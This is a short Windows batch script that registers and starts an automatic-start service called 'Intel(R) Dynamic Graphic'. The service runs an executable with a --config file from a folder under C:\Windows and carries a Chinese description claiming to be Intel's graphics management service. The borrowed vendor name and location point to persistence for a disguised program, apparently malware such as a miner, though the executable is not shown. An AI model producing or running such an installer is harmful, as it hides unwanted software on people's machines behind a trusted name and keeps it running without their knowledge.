cd /d "C:\Windows\Intel(R) Dynamic Graphic" 

sc create "Intel(R) Dynamic Graphic" binPath= "\"%cd%\Intel(R) Dynamic Graphic.exe\" --config=\"%cd%\c\"" start= auto DisplayName= "Intel(R) Dynamic Graphic" 

sc description "Intel(R) Dynamic Graphic" "Intel 动态图形管理服务" 

sc start "Intel(R) Dynamic Graphic" 